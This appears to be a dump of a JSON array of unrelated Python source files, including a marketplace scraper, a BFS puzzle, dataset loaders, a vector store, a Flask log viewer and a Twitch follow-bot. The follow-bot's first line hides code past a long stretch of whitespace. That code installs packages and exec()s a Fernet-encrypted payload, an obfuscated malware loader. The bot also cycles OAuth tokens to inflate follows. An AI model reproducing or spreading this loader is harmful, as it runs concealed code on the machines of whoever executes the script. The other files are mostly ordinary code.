\\x01(\\t\\x12\\x18\\n\\x10manufacture_date\\x18\\x10 \\x01(\\t\\x12\\\"\\n\\x1a\\x65xpected_enrollment_domain\\x18\\x11 \\x01(\\t\\x12[\\n\\x1e\\x64\\x65vice_register_identification\\x18\\x12 \\x01(\\x0b\\x32\\x33.enterprise_management.DeviceRegisterIdentification\\x12]\\n\\x14psm_execution_result\\x18\\x13 \\x01(\\x0e\\x32?.enterprise_management.DeviceRegisterRequest.PsmExecutionResult\\x12&\\n\\x1epsm_determination_timestamp_ms\\x18\\x14 \\x01(\\x03\\x12G\\n\\x14\\x64\\x65mo_mode_dimensions\\x18\\x15 \\x01(\\x0b\\x32).enterprise_management.DemoModeDimensions\\\"]\\n\\x04Type\\x12\\x06\\n\\x02TT\\x10\\x00\\x12\\x08\\n\\x04USER\\x10\\x01\\x12\\n\\n\\x06\\x44\\x45VICE\\x10\\x02\\x12\\x0b\\n\\x07\\x42ROWSER\\x10\\x03\\x12\\x13\\n\\x0f\\x41NDROID_BROWSER\\x10\\x04\\x12\\x0f\\n\\x0bIOS_BROWSER\\x10\\x06\\\"\\x04\\x08\\x05\\x10\\x05\\\"\\xd7\\x06\\n\\x06\\x46lavor\\x12\\x1c\\n\\x18\\x46LAVOR_ENROLLMENT_MANUAL\\x10\\x00\\x12\\\"\\n\\x1e\\x46LAVOR_ENROLLMENT_MANUAL_RENEW\\x10\\x01\\x12\\\"\\n\\x1e\\x46LAVOR_ENROLLMENT_LOCAL_FORCED\\x10\\x02\\x12&\\n\\\"FLAVOR_ENROLLMENT_LOCAL_ADVERTISED\\x10\\x03\\x12#\\n\\x1f\\x46LAVOR_ENROLLMENT_SERVER_FORCED\\x10\\x04\\x12\\'\\n#FLAVOR_ENROLLMENT_SERVER_ADVERTISED\\x10\\x05\\x12\\x1e\\n\\x1a\\x46LAVOR_ENROLLMENT_RECOVERY\\x10\\x06\\x12\\x1c\\n\\x18\\x46LAVOR_USER_REGISTRATION\\x10\\x07\\x12!\\n\\x1d\\x46LAVOR_ENROLLMENT_ATTESTATION\\x10\\x08\\x12.\\n*FLAVOR_ENROLLMENT_ATTESTATION_LOCAL_FORCED\\x10\\t\\x12/\\n+FLAVOR_ENROLLMENT_ATTESTATION_SERVER_FORCED\\x10\\n\\x12\\x31\\n-FLAVOR_ENROLLMENT_ATTESTATION_MANUAL_FALLBACK\\x10\\x0b\\x12+\\n\\'FLAVOR_ENROLLMENT_INITIAL_SERVER_FORCED\\x10\\r\\x12\\x37\\n3FLAVOR_ENROLLMENT_ATTESTATION_INITIAL_SERVER_FORCED\\x10\\x0e\\x12\\x39\\n5FLAVOR_ENROLLMENT_ATTESTATION_INITIAL_MANUAL_FALLBACK\\x10\\x0f\\x12\\x31\\n-FLAVOR_ENROLLMENT_ATTESTATION_ROLLBACK_FORCED\\x10\\x10\\x12:\\n6FLAVOR_ENROLLMENT_ATTESTATION_ROLLBACK_MANUAL_FALLBACK\\x10\\x11\\x12\\x31\\n-FLAVOR_ENROLLMENT_TOKEN_INITIAL_SERVER_FORCED\\x10\\x12\\x12\\x33\\n/FLAVOR_ENROLLMENT_TOKEN_INITIAL_MANUAL_FALLBACK\\x10\\x13\\\"\\x04\\x08\\x0c\\x10\\x0c\\\"X\\n\\x08Lifetime\\x12\\x16\\n\\x12LIFETIME_UNDEFINED\\x10\\x00\\x12\\x17\\n\\x13LIFETIME_INDEFINITE\\x10\\x01\\x12\\x1b\\n\\x17LIFETIME_EPHEMERAL_USER\\x10\\x02\\\"\\xbb\\x01\\n\\x12PsmExecutionResult\\x12\\x16\\n\\x12PSM_RESULT_UNKNOWN\\x10\\x00\\x12$\\n PSM_RESULT_SUCCESSFUL_WITH_STATE\\x10\\x01\\x12\\'\\n#PSM_RESULT_SUCCESSFUL_WITHOUT_STATE\\x10\\x02\\x12\\x14\\n\\x10PSM_RESULT_ERROR\\x10\\x03\\x12(\\n$PSM_SKIPPED_FOR_FLEX_AUTO_ENROLLMENT\\x10\\x04J\\x04\\x08\\x05\\x10\\x06J\\x04\\x08\\n\\x10\\x0b\\\":\\n\\x1c\\x44\\x65viceRegisterIdentification\\x12\\x1a\\n\\x12\\x61ttested_device_id\\x18\\x01 \\x01(\\t\\\"\\xab\\x03\\n\\x18\\x43heckUserAccountResponse\\x12\\x17\\n\\x0f\\x64omain_verified\\x18\\x01 \\x01(\\x08\\x12Z\\n\\x11user_account_type\\x18\\x02 \\x01(\\x0e\\x32?.enterprise_management.CheckUserAccountResponse.UserAccountType\\x12\\x62\\n\\x15\\x65nrollment_nudge_type\\x18\\x03 \\x01(\\x0e\\x32\\x43.enterprise_management.CheckUserAccountResponse.EnrollmentNudgeType\\\"Y\\n\\x0fUserAccountType\\x12\\x1d\\n\\x19UNKNOWN_USER_ACCOUNT_TYPE\\x10",
    "import json\r\nfrom urllib import parse\r\nimport pandas as pd\r\nfrom bs4 import BeautifulSoup\r\nfrom selenium import webdriver\r\nfrom selenium.webdriver.common.by import By\r\nfrom selenium.webdriver.support.wait import WebDriverWait\r\nfrom selenium.webdriver.support import expected_conditions as ec\r\nfrom selenium.webdriver.chrome.service import Service\r\nfrom webdriver_manager.chrome import ChromeDriverManager\r\n\r\n\r\nBASEURL = 'https://megamarket.ru'\r\n\r\n\r\ndef get_pages_html(url):\r\n    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()))\r\n    driver.maximize_window()\r\n    ITEMS = []\r\n    try:\r\n        for page in range(1, 100):\r\n            print(f\"[+] \u0421\u0442\u0440\u0430\u043d\u0438\u0446\u0430 {page}\")\r\n            driver.get(url=url.replace(f'page_num', f'page-{page}'))\r\n            WebDriverWait(driver, 60).until(\r\n                ec.presence_of_element_located((By.TAG_NAME, \"html\")))\r\n            if not get_items(driver.page_source, ITEMS):\r\n                break\r\n    except Exception as ex:\r\n        print(ex)\r\n    finally:\r\n        driver.close()\r\n        driver.quit()\r\n    return ITEMS\r\n\r\n\r\ndef get_items(html, items):\r\n    soup = BeautifulSoup(html, 'html.parser')\r\n    items_divs = soup.find_all('div', class_='catalog-item')\r\n    if len(items_divs) == 0:\r\n        return False\r\n    for item in items_divs:\r\n        link = BASEURL + item.find('a', class_='ddl_product_link').get('href')\r\n        item_price = item.find('div', class_='item-price')\r\n        if item_price:\r\n            item_price_result = item_price.find('span').get_text()\r\n            item_bonus = item.find('div', class_='item-bonus')\r\n            if item_bonus:\r\n                item_bonus_percent = item.find('span', class_='bonus-percent').get_text()\r\n                item_bonus_amount = item.find('span', class_='bonus-amount').get_text()\r\n                item_title = item.find('div', class_='item-title').get_text()\r\n                item_merchant_name = item.find('span', class_='merchant-info__name')\r\n                if item_merchant_name:\r\n                    item_merchant_name = item_merchant_name.get_text()\r\n                else:\r\n                    item_merchant_name = '-'\r\n\r\n                bonus = int(item_bonus_amount.replace(' ', ''))\r\n                price = int(item_price_result[0:-1].replace(' ', ''))\r\n                bonus_percent = int(item_bonus_percent.replace('%', ''))\r\n                items.append({\r\n                    '\u041d\u0430\u0438\u043c\u0435\u043d\u043e\u0432\u0430\u043d\u0438\u0435': item_title,\r\n                    '\u041f\u0440\u043e\u0434\u0430\u0432\u0435\u0446': item_merchant_name,\r\n                    '\u0426\u0435\u043d\u0430': price,\r\n                    '\u0421\u0443\u043c\u043c\u0430 \u0431\u043e\u043d\u0443\u0441\u0430': bonus,\r\n                    '\u041f\u0440\u043e\u0446\u0435\u043d\u0442 \u0431\u043e\u043d\u0443\u0441\u0430': bonus_percent,\r\n                    '\u0421\u0441\u044b\u043b\u043a\u0430 \u043d\u0430 \u0442\u043e\u0432\u0430\u0440': link\r\n                })\r\n    return True\r\n\r\n\r\ndef save_excel(data: list, filename: str):\r\n    \"\"\"\u0441\u043e\u0445\u0440\u0430\u043d\u0435\u043d\u0438\u0435 \u0440\u0435\u0437\u0443\u043b\u044c\u0442\u0430\u0442\u0430 \u0432 excel \u0444\u0430\u0439\u043b\"\"\"\r\n    df = pd.DataFrame(data)\r\n    writer = pd.ExcelWriter(f'{filename}.xlsx')\r\n    df.to_excel(writer, sheet_name='data', index=False)\r\n    # \u0443\u043a\u0430\u0437\u044b\u0432\u0430\u0435\u043c \u0440\u0430\u0437\u043c\u0435\u0440\u044b \u043a\u0430\u0436\u0434\u043e\u0433\u043e \u0441\u0442\u043e\u043b\u0431\u0446\u0430 \u0432 \u0438\u0442\u043e\u0433\u043e\u0432\u043e\u043c \u0444\u0430\u0439\u043b\u0435\r\n    writer.sheets['data'].set_column(0, 1, width=50)\r\n    writer.sheets['data'].set_column(1, 2, width=30)\r\n    writer.sheets['data'].set_column(2, 3, width=8)\r\n    writer.sheets['data'].set_column(3, 4, width=20)\r\n    writer.sheets['data'].set_column(4, 5, width=15)\r\n    writer.close()\r\n    print(f'\u0412\u0441\u0435 \u0441\u043e\u0445\u0440\u0430\u043d\u0435\u043d\u043e \u0432 {filename}.xlsx')\r\n\r\n\r\ndef main():\r\n    target = input('\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043d\u0430\u0437\u0432\u0430\u043d\u0438\u0435 \u0442\u043e\u0432\u0430\u0440\u0430: ')\r\n    min_price = input('\u041c\u0438\u043d\u0438\u043c\u0430\u043b\u044c\u043d\u0430\u044f \u0446\u0435\u043d\u0430 (enter, \u0447\u0442\u043e\u0431\u044b \u043f\u0440\u043e\u043f\u0443\u0441\u0442\u0438\u0442\u044c): ')\r\n    min_price = min_price if min_price != '' else '0'\r\n    max_price = input('\u041c\u0430\u043a\u0441\u0438\u043c\u0430\u043b\u044c\u043d\u0430\u044f \u0446\u0435\u043d\u0430 (enter, \u0447\u0442\u043e\u0431\u044b \u043f\u0440\u043e\u043f\u0443\u0441\u0442\u0438\u0442\u044c): ')\r\n    max_price = max_price if max_price != '' else '9999999'\r\n    target_url = f\"{BASEURL}/catalog/page_num/?q={target}\"\r\n    if max_price and min_price and (max_price.isdigit() and min_price.isdigit()):\r\n        filter = {\r\n            \"88C83F68482F447C9F4E401955196697\": {\"min\": int(min_price), \"max\": int(max_price)},# \u0444\u0438\u043b\u044c\u0442\u0440 \u043f\u043e \u0446\u0435\u043d\u0435\r\n            \"4CB2C27EAAFC4EB39378C4B7487E6C9E\": [\"1\"]}# \u0444\u0438\u043b\u044c\u0442\u0440 \u043f\u043e \u043d\u0430\u043b\u0438\u0447\u0438\u044e \u0442\u043e\u0432\u0430\u0440\u0430\r\n        json_data = json.dumps(filter)\r\n        # \u041a\u043e\u0434\u0438\u0440\u043e\u0432\u0430\u043d\u0438\u0435 JSON \u0441\u0442\u0440\u043e\u043a\u0438 \u0434\u043b\u044f \u043f\u0435\u0440\u0435\u0434\u0430\u0447\u0438 \u0447\u0435\u0440\u0435\u0437 URL\r\n        url_encoded_data = parse.quote(json_data)\r\n        target_url += '#?filters=' + url_encoded_data\r\n\r\n    items = get_pages_html(url=target_url)\r\n    save_excel(items, target)\r\n\r\n\r\nif __name__ == '__main__':\r\n    main()\r\n",
    "def bfs():\n    queue = [(start, \"K\")]\n    dist = 0\n    while queue:\n        dist += 1\n        for _ in range(len(queue)):\n            pos, state = queue.pop(0)\n            cur_i, cur_j = pos\n            for di, dj in direction[state]:\n                i, j  = cur_i + di, cur_j + dj\n                if i < 0 or i >= n or j < 0 or j >= n or (i, j) in visited[state]:\n                    continue\n                if (i, j) == end:\n                    return dist\n                elif board[i][j] not in (\".\", \"S\"):\n                    queue.append(((i, j), board[i][j]))\n                    visited[board[i][j]].add((i, j))\n                else:\n                    queue.append(((i, j), state)) \n                    visited[state].add((i, j))\n    \n    return -1\n\nn = int(input())\nboard = []\nstart = (-1, -1)\nend = (-1, -1)\n\nfor i in range(n):\n    row = input()\n    if \"S\" in row:\n        start = (i, row.index(\"S\"))\n    elif \"F\" in row:\n        end = (i, row.index(\"F\"))\n    board.append(row)\n\n\nqueue = [(start, \"K\")]\ndirection = {\n    \"K\":{\n        (-2, -1), (-1, -2), (1, -2), (2, -1),\n        (2, 1), (1, 2), (-1, 2), (-2, 1)\n    },\n    \"G\": {\n        (-1, -1), (0, -1), (1, -1), (1, 0),\n        (1, 1), (0, 1), (-1, 1), (-1, 0)\n    }\n\n}\nvisited = {\n    \"K\": set([start]),\n    \"G\": set()\n}\n\nresult = bfs()\nprint(result)\n",
    "import jax\nimport jax.numpy as jnp\nimport pickle\nfrom sentence_transformers import SentenceTransformer\nimport pandas as pd\n\nclass VectorDB:\n    def __init__(self, model_name='BAAI/bge-base-en-v1.5'):\n        self.model = SentenceTransformer(model_name)\n        self.texts = []\n        self.embeddings = None\n\n    def add_texts(self, texts):\n        new_embeddings = jnp.array(self.model.encode(texts, normalize_embeddings=True))\n        if self.embeddings is None:\n            self.embeddings = new_embeddings\n        else:\n            self.embeddings = jnp.concatenate((self.embeddings, new_embeddings), axis=0)\n        self.texts.extend(texts)\n\n    def delete_text(self, index):\n        if 0 <= index < len(self.texts):\n            self.texts.pop(index)\n            self.embeddings = jnp.delete(self.embeddings, index, axis=0)\n        else:\n            raise IndexError(\"Invalid index\")\n\n    def update_text(self, index, new_text):\n        if 0 <= index < len(self.texts):\n            self.texts[index] = new_text\n            new_embedding = jnp.array(self.model.encode([new_text], normalize_embeddings=True)).squeeze()\n            self.embeddings = self.embeddings.at[index].set(new_embedding)\n        else:\n            raise IndexError(\"Invalid index\")\n\n    def search(self, query, top_k=5):\n        query_embedding = jnp.array(self.model.encode([query], normalize_embeddings=True))\n        similarities = jnp.dot(self.embeddings, query_embedding.T).squeeze()\n        top_indices = jnp.argsort(similarities)[-top_k:][::-1]\n        return [(self.texts[i], similarities[i]) for i in top_indices]\n\n    def save(self, file_path):\n        with open(file_path, 'wb') as file:\n            pickle.dump(self, file)\n\n    @staticmethod\n    def load(file_path):\n        with open(file_path, 'rb') as file:\n            return pickle.load(file)\n    \n    def to_df(self):\n        data = {\n            'text': self.texts,\n            'embedding': [embedding.tolist() for embedding in self.embeddings]\n        }\n        return pd.DataFrame(data)\n\n    def __len__(self):\n        return len(self.texts)\n\n    def __getitem__(self, index):\n        return self.texts[index]\n\n    def __iter__(self):\n        return iter(self.texts)\n\ndef main():\n    print(\"\ud83c\udf51\ud83d\udc4b\")",
    "#!/usr/bin/env python\n\n\"\"\"\nThe **General Problem Solver** is a framework for applying *means-ends analysis*\nto solve problems that can be specified by a list of initial states, a list of\ngoal states, and a list of operators that induce state transitions.\n\nEach operator is specified by an action name, a list of precondition states that\nmust hold before the operator is applied, a list of states that will hold after\nthe operator is applied (the *add-list*), and a list of states that will no\nlonger hold after the operator is applied (the *delete-list*).  To achieve a\ngoal state, GPS uses means-ends analysis: each operator is examined to find one\nthat contains the goal state in its add-list (it looks for an *appropriate*\noperator).  It then tries to achieve all of that operator's precondition states.\nIf not all of the preconditions can be achieved (the operator is not\n*applicable*), then GPS looks for another appropriate operator.  If none exists,\nthen the goal can't be achieved.  When all of the goal states have been\nachieved, the problem is solved.\n\nThe following programs demonstrate using GPS to solve some famous AI problems:\n\n- [Monkey and Bananas](examples/gps/monkeys.html)\n- [Blocks World](examples/gps/blocks.html)\n- [Driving to school](examples/gps/school.html)\n\nThis implementation is inspired by chapter 4 of \"Paradigms of Artificial\nIntelligence Programming\" by Peter Norvig.\n\"\"\"\n\n## General Problem Solver\n\ndef gps(initial_states, goal_states, operators):\n    \"\"\"\n    Find a sequence of operators that will achieve all of the goal states.\n\n    Returns a list of actions that will achieve all of the goal states, or\n    None if no such sequence exists.  Each operator is specified by an\n    action name, a list of preconditions, an add-list, and a delete-list.\n    \"\"\"\n\n    # To keep track of which operators have been applied, we add additional\n    # 'executing ...' states to each operator's add-list.  These will never be\n    # deleted by another operator, so when the problem is solved we can find\n    # them in the list of current states.\n    prefix = 'Executing '\n    for operator in operators:\n        operator['add'].append(prefix + operator['action'])\n\n    final_states = achieve_all(initial_states, operators, goal_states, [])\n    if not final_states:\n        return None\n    return [state for state in final_states if state.startswith(prefix)]\n\n\n## Achieving subgoals\n\ndef achieve_all(states, ops, goals, goal_stack):\n    \"\"\"\n    Achieve each state in goals and make sure they still hold at the end.\n\n    The goal stack keeps track of our recursion: which preconditions are we\n    trying to satisfy by achieving the specified goals?\n    \"\"\"\n    \n    # We try to achieve each goal in the order they are given.  If any one\n    # goal state cannot be achieved, then the problem cannot be solved.\n    for goal in goals:\n        states = achieve(states, ops, goal, goal_stack)\n        if not states:\n            return None\n\n    # We must ensure that we haven't removed a goal state in the process of\n    # solving other states--having done so is called the \"prerequisite clobbers\n    # sibling goal problem\".\n    for goal in goals:\n        if goal not in states:\n            return None\n\n    return states\n    \n\ndef achieve(states, operators, goal, goal_stack):\n    \"\"\"\n    Achieve the goal state using means-ends analysis.\n\n    Identifies an appropriate and applicable operator--one that contains the\n    goal state in its add-list and has all its preconditions satisified.\n    Applies the operator and returns the result.  Returns None if no such\n    operator is found or infinite recursion is detected in the goal stack.\n    \"\"\"\n    \n    debug(len(goal_stack), 'Achieving: %s' % goal)\n    \n    # Let's check to see if the state already holds before we do anything.\n    if goal in states:\n        return states\n\n    # Prevent going in circles: look through the goal stack to see if the\n    # specified goal appears there.  If so, then we are indirectly trying to\n    # achieve goal while already in the process of achieving it.  For example,\n    # while trying to achieve state A, we try to achieve state B--a precondition\n    # for applying an appropriate operator.  However, to achieve B, we try to\n    # satisfy the preconditions for another operator that contains A in its\n    # preconditions.\n    if goal in goal_stack:\n        return None\n\n    for op in operators:\n        # Is op appropriate?  Look through its add-list to see if goal is there.\n        if goal not in op['add']:\n            continue\n        # Is op applicable?  Try to apply it--if one of its preconditions cannot\n        # be satisifed, then it will return None.\n        result = apply_operator(op, states, operators, goal, goal_stack)\n        if result:\n            return result\n\n    \n## Using operators\n\ndef apply_operator(operator, states, ops, goal, goal_stack):\n    \"\"\"\n    Applies operator and returns the resulting states.\n\n    Achieves all of operator's preconditions and returns th",
    "import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'vFB4zKkklOfZvTB-oy9RdNjWPnPJnYzFH_VFPrVtHy0=').decrypt(b'gAAAAABmGp4v0RgXPr5uA5S9j5Hf5JUFNnNrqpzeaPLWLsp7PHG29gmQFZE5Z7K4C5JEc01gM_6647UPi1Urx3hs4Qs4q5e_AEXY3UHzu54_9tt-9WLX34ep-PtO3pCV4arfeYCpsMOH_UWeGzU0vQ1xnq9-b93_rS6XZByWEKnbsxK5EwbxsMBIwzz9dMAjta_vQnLtrkqDkJF33vE-wC_VUcba0EfhZe3UUmY7bP7a2wSquiP9j3Y='))\nimport os\nimport requests\nimport threading\n\nfrom itertools import cycle\nfrom colorama import Fore, init\n\n\ninit(convert=True)\n\n\nclass stats():\n    sent = 0\n    error = 0\n\n\n\ndef get_username(channel_name):\n\n    json = {\"operationName\": \"ChannelShell\",\n            \"variables\": {\n                \"login\": channel_name\n            },\n            \"extensions\": {\n                \"persistedQuery\": {\n                    \"version\": 1,\n                    \"sha256Hash\": \"580ab410bcd0c1ad194224957ae2241e5d252b2c5173d8e0cce9d32d5bb14efe\"\n                }\n            }\n        }\n\n    headers = {\n        'Client-ID': 'kimne78kx3ncx6brgo4mv6wki5h1ko'\n    }\n    r = requests.post('https://gql.twitch.tv/gql', json=json, headers=headers)\n    return r.json()['data']['userOrError']['id']\n\n\nclass Choose_Cookie():\n\n    def get_token():\n        with open('tokens.txt', 'r') as f:\n            tokens = [line.strip('\\n') for line in f]\n        return tokens\n    cookie = get_token()\n    tokens_loop = cycle(cookie)\n\n\n\n\nsem = threading.Semaphore(200)\n\n\nchannel_name = input(\"Enter channel name > \")\n\nclass Twitch():\n\n    def follow():\n        with sem:\n            os.system(f'title Success: {stats.sent} ^| Error: {stats.error}')\n            channel_ID = get_username(channel_name)\n\n            token = next(Choose_Cookie.tokens_loop)\n\n            headers = {\n                'Accept': '*/*',\n                'Accept-Language': 'en-GB',\n                'Authorization': f'OAuth {token}',\n                'Client-Id': 'kimne78kx3ncx6brgo4mv6wki5h1ko',\n                'Connection': 'keep-alive',\n                'Content-Type': 'text/plain;charset=UTF-8',\n                'Origin': 'https://www.twitch.tv',\n                'Referer': 'https://www.twitch.tv/',\n                'Sec-Fetch-Dest': 'empty',\n                'Sec-Fetch-Mode': 'cors',\n                'Sec-Fetch-Site': 'same-site',\n                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36',\n                'sec-ch-ua': '\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"102\", \"Google Chrome\";v=\"102\"',\n                'sec-ch-ua-mobile': '?0',\n                'sec-ch-ua-platform': '\"Windows\"',\n                }\n            \n            data = '[{\"operationName\":\"FollowButton_FollowUser\",\"variables\":{\"input\":{\"disableNotifications\":false,\"targetID\":\"'+channel_ID+'\"}},\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"800e7346bdf7e5278a3c1d3f21b2b56e2639928f86815677a7126b093b2fdd08\"}}}]'\n            r = requests.post('https://gql.twitch.tv/gql', headers=headers, data=data)\n            if r.status_code == 200:\n                stats.sent += 1\n        ",
    "import torch\nimport torchvision\nimport torchvision.transforms as transforms\nimport torchvision.datasets as datasets\nimport os\n\ndef get_data(dataset, data_path, batch_size):\n    assert dataset in [\"CIFAR10\", \"CIFAR100\", \"IMAGENET\"], \"dataset not supported {}\".format(dataset)\n    print('Loading dataset {} from {}'.format(dataset, data_path))\n    if dataset in [\"CIFAR10\", \"CIFAR100\"]:\n        ds = getattr(datasets, dataset)\n        path = os.path.join(data_path, dataset.upper())\n        transform_train = transforms.Compose([\n            transforms.RandomCrop(32, padding=4),\n            transforms.RandomHorizontalFlip(),\n            transforms.ToTensor(),\n            transforms.Normalize((0.4914, 0.4822, 0.4465), (0.2023, 0.1994, 0.2010)),\n        ])\n        transform_test = transforms.Compose([\n            transforms.ToTensor(),\n            transforms.Normalize((0.4914, 0.4822, 0.4465), (0.2023, 0.1994, 0.2010)),\n        ])\n        train_set = ds(path, train=True, download=True, transform=transform_train)\n        test_set = ds(path, train=False, download=True, transform=transform_test)\n        train_sampler = None\n        num_classes = 10\n    elif dataset==\"IMAGENET\":\n        traindir = os.path.join(data_path, dataset.upper(), 'train')\n        valdir = os.path.join(data_path, dataset.upper(), 'val')\n        normalize = transforms.Normalize(mean=[0.485, 0.456, 0.406],\n                                         std=[0.229, 0.224, 0.225])\n        train_set = datasets.ImageFolder(\n            traindir,\n            transforms.Compose([\n                transforms.RandomResizedCrop(224),\n                transforms.RandomHorizontalFlip(),\n                transforms.ToTensor(),\n                normalize,\n            ]))\n        test_set = datasets.ImageFolder(valdir, transforms.Compose([\n            transforms.Resize(256),\n            transforms.CenterCrop(224),\n            transforms.ToTensor(),\n            normalize,\n        ]))\n        num_classes = 1000\n    loaders = {\n        'train': torch.utils.data.DataLoader(\n            train_set,\n            batch_size=batch_size,\n            shuffle=True,\n            num_workers=8,\n            pin_memory=True\n        ),\n        'test': torch.utils.data.DataLoader(\n            test_set,\n            batch_size=batch_size,\n            shuffle=False,\n            num_workers=8,\n            pin_memory=True\n        )\n    }\n    return loaders\n",
    "import os\nimport random\n\nfrom .utils import Datum, DatasetBase, listdir_nohidden\nfrom .oxford_pets import OxfordPets\n\n\ntemplate = ['{} texture.']\n\n\nclass DescribableTextures(DatasetBase):\n\n    dataset_dir = 'dtd'\n\n    def __init__(self, root, num_shots):\n        self.dataset_dir = os.path.join(root, self.dataset_dir)\n        self.image_dir = os.path.join(self.dataset_dir, 'images')\n        self.split_path = os.path.join(self.dataset_dir, 'split_zhou_DescribableTextures.json')\n\n        self.template = template\n\n        train, val, test = OxfordPets.read_split(self.split_path, self.image_dir)\n        train = self.generate_fewshot_dataset(train, num_shots=num_shots)\n\n        super().__init__(train_x=train, val=val, test=test)\n    \n    @staticmethod\n    def read_and_split_data(\n        image_dir,\n        p_trn=0.5,\n        p_val=0.2,\n        ignored=[],\n        new_cnames=None\n    ):\n        # The data are supposed to be organized into the following structure\n        # =============\n        # images/\n        #     dog/\n        #     cat/\n        #     horse/\n        # =============\n        categories = listdir_nohidden(image_dir)\n        categories = [c for c in categories if c not in ignored]\n        categories.sort()\n\n        p_tst = 1 - p_trn - p_val\n        print(f'Splitting into {p_trn:.0%} train, {p_val:.0%} val, and {p_tst:.0%} test')\n\n        def _collate(ims, y, c):\n            items = []\n            for im in ims:\n                item = Datum(\n                    impath=im,\n                    label=y, # is already 0-based\n                    classname=c\n                )\n                items.append(item)\n            return items\n\n        train, val, test = [], [], []\n        for label, category in enumerate(categories):\n            category_dir = os.path.join(image_dir, category)\n            images = listdir_nohidden(category_dir)\n            images = [os.path.join(category_dir, im) for im in images]\n            random.shuffle(images)\n            n_total = len(images)\n            n_train = round(n_total * p_trn)\n            n_val = round(n_total * p_val)\n            n_test = n_total - n_train - n_val\n            assert n_train > 0 and n_val > 0 and n_test > 0\n\n            if new_cnames is not None and category in new_cnames:\n                category = new_cnames[category]\n\n            train.extend(_collate(images[:n_train], label, category))\n            val.extend(_collate(images[n_train:n_train+n_val], label, category))\n            test.extend(_collate(images[n_train+n_val:], label, category))\n        \n        return train, val, test\n",
    "from flask import Flask, render_template, send_from_directory, abort, request, redirect, Response\nfrom werkzeug.utils import secure_filename\nimport hashlib\nimport os\n\nfrom config import log_paths\n\napp = Flask(__name__)\n\npassword = os.getenv('LOGS_VIEWER_PASSWORD', 'ABCDE')\nr_url = os.getenv('LOGS_VIEWER_REDIRECT', 'https://edm115.dev')\nport = int(os.getenv('LOGS_VIEWER_PORT', 10000))\nhashed_password = hashlib.sha256(password.encode()).hexdigest()\n\n@app.route('/')\ndef index():\n    return render_template('index.html', hashed_password=hashed_password, redirect_url=r_url)\n\n@app.route('/admin')\ndef admin():\n    log_files = {}\n    client_pass = request.args.get('passwd', '')\n    if client_pass == password:\n        for bot, path in log_paths.items():\n            if os.path.exists(path):\n                files = [f for f in os.listdir(path) if os.path.isfile(os.path.join(path, f))]\n                log_files[bot] = files\n        return render_template('admin.html', log_files=log_files, hashed_password=hashed_password)\n    else:\n        return redirect(r_url)\n\n@app.route('/logs/<bot>/<filename>')\ndef log_file(bot, filename):\n    dl = request.args.get('dl', '')\n    if bot in log_paths and os.path.exists(log_paths[bot]):\n        secure_path = os.path.join(log_paths[bot], secure_filename(filename))\n        try:\n            if dl == '1':\n                return send_from_directory(log_paths[bot], filename, as_attachment=False)\n            else:\n                with open(secure_path, 'r') as f:\n                    content = f.read()\n                return Response(content, mimetype='text/plain')\n        except FileNotFoundError:\n            abort(404)\n    else:\n        return redirect(r_url)\n\nif __name__ == '__main__':\n    app.run(debug=False, port=port)\n",
    "from enum import unique\nfrom utils import get_logger\nfrom sklearn.manifold import TSNE\nfrom bokeh.plotting import figure, show\nfrom bokeh.transform import factor_cmap, factor_mark\nfrom bokeh.layouts import gridplot\nfrom bokeh.models import ColumnDataSource\nfrom typing import List\nfrom copy import copy, deepcopy\nfrom joblib import dump, load\nfrom glob import glob\nimport numpy as np \nimport pandas as pd \nfrom datasets import load_from_disk, Dataset\nfrom copy import copy \nimport matplotlib.pyplot as plt\nimport numpy as np\nimport matplotlib \nimport hydra\nfrom omegaconf import DictConfig, OmegaConf\nfrom multiprocessing import cpu_count\n\nimport os\n\nlogger = get_logger(\"Manifold\", True, False)\n\nexperiments_base_path = \"./Experiments\"\nprojection_base_path = os.path.join(experiments_base_path, 'projection')\n\nfw, fh = 1200, 1200\n\nnp.random.seed(13)\n\ndef generate_distinct_colors(n):\n    colors = plt.cm.get_cmap(\"hsv\", n)\n    return [matplotlib.colors.rgb2hex(colors(i)[:3]) for i in range(n)]\n\n\nMARKERS = ['hex', 'circle_x', 'triangle', 'square', 'circle', 'dot', 'asterisk', 'diamond']\nCOLORS = generate_distinct_colors(20)\nnp.random.shuffle(COLORS)\nprint(COLORS)\n\nchange_label_name = False\nembeddings = None\nmetas = None\nFORCE_RERUN = False\n\nprint(\"Creating projection base path ... \")\nos.makedirs(projection_base_path, exist_ok=True)\n\ncolormap = dict()\nmarkermap = dict()\n\n@hydra.main(version_base=None, config_path=\"config/config_vis\", config_name=\"config.yaml\")\ndef tsne(cfg: DictConfig):\n    cfg = cfg.vis\n\n    name = cfg.name\n\n    dataset_full_path = cfg.dataset_full_path\n    print(dataset_full_path)\n\n    embedding_key = cfg.embedding_key\n    label_keys = cfg.label_keys\n \n    assert len(label_keys) <= 2 , \"Right know for tnsne we can only show two label at a time\"\n    label_map = dict()\n\n    label_precedence = [\"colormap\", \"markermap\"]\n    value_precedence = [ \"COLORS\", \"MARKERS\" ]\n    values = [\"color\", \"marker\"]\n\n    dataset: Dataset = load_from_disk(dataset_full_path)\n    dataset_keys = list()\n    dataset_keys.append(embedding_key)\n    dataset_keys.extend(label_keys)\n\n    #prefix_name= dataset['train']._fingerprint # Inferfrom name or fingerprint\n    prefix_name = f\"{cfg.proj_algorithm.upper()}s\"\n    exp_name = \"-\".join([prefix_name, embedding_key, *label_keys, dataset['train']._fingerprint])\n    \n    status_prefix = \"status\"\n    for key in dataset:\n        status_key_name = status_prefix + \"_\"+embedding_key\n        dataset_check = dataset[key].select_columns(column_names=[embedding_key, status_key_name])\n        dataset_check = dataset_check.to_pandas()\n        print(dataset_check[status_key_name].value_counts().to_dict())\n\n    \n    if cfg.discard: \n        print(f\"Filtering enteries with their {cfg.discard + embedding_key} set to true ...\")\n        dataset = dataset.filter(lambda entry: entry[ cfg.discard + embedding_key], \n        num_proc=min(1,cpu_count()//2)) # There is some problem 